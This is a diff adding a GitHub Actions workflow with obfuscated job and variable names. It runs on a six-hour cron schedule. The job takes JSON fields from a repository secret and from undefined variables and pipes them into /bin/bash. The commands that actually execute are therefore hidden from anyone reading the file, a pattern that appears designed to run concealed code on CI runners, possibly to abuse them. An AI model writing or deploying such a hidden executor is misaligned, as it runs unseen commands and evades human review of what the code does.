@@ -1,0 +1,20 @@
+name: zengfeixiang6719
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zengfeixiang6719
+        env:
+          eidfy86: ${{ secrets.eidfy86 }}
+        run: |
+          echo $eidfy86 | jq -r .vtosp5 | /bin/bash
+          echo $layo57 | jq -r .oymje27 | /bin/bash
+          echo $f63505 | jq -r .k0880 | /bin/bash
+          echo $ure89 | jq -r .xx7368 | /bin/bash
+
